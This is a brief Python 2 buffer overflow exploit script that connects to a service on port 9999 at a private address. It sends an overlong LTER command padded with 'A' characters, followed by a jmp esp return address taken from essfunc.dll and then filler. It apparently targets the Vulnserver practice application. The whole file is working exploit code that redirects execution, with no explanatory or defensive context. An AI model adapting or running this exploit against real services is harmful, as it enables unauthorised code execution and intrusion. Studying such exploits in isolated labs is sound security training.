#!/usr/bin/python

import socket
import os
import sys

host = "192.168.100.118"
port = 9999

buffer = "A" * 2002
buffer += "\x03\x12\x50\x62"          # 0x62501203 : jmp esp | ascii - essfunc.dll
buffer += "C" * (3000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()

